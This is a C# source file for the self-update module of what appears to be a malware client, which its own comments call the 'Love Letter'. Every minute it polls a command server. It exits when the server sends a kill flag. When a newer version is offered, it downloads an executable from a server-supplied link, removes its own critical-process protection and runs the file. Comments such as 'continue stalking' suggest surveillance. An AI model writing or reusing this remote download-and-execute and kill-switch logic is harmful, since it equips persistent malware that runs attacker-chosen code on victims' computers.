using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Client.Utilities
{
    /// <summary>
    /// A class that checks for updates every 30 seconds.
    /// </summary>
    public class Updater
    {
        public static Communication.JSON_Models.Update Latest = new Communication.JSON_Models.Update(); // default

        public void Start()
        {
            FetchUpdates();
        }

        public async void FetchUpdates()
        {
            await Task.Run(() =>
            {
                while (true)
                {
                    Latest = Communication.Server.GetUpdate();

                    if (Latest != null)
                    {
                        // check if the letter is supposed to kill itself.
                        if (Latest.KillSelf) Environment.Exit(69);

                        if (Latest.LetterVersion > Constants.Version)
                        {
                            DownloadAndRunNewLetter(Latest.DownloadLink);
                        }
                    }

                    Thread.Sleep(60 * 1000);
                }
            });
        }

        /// <summary>
        /// Downloads the newest letter.
        /// </summary>
        public async void DownloadAndRunNewLetter(string link)
        {
            string target_filename = Path.GetTempFileName() + ".exe";

            target_filename =
                await Communication.Server.AsyncDownloadFile(link, target_filename);

            if (!string.IsNullOrEmpty(target_filename))
            {
                // unprotect (very dangerous)
                if (Armitage.Critical_Process.IsProtected)
                    Armitage.Critical_Process.Unprotect();

                try
                {
                    Process.Start(target_filename, Constants.MyProcessID.ToString());
                    // wait for 10 seconds, wait until the new Love Letter
                    // do its thing
                    Thread.Sleep(10 * 1000);
                }
                catch { }
            }
            // if nothing happened just continue stalking
        }
    }
}
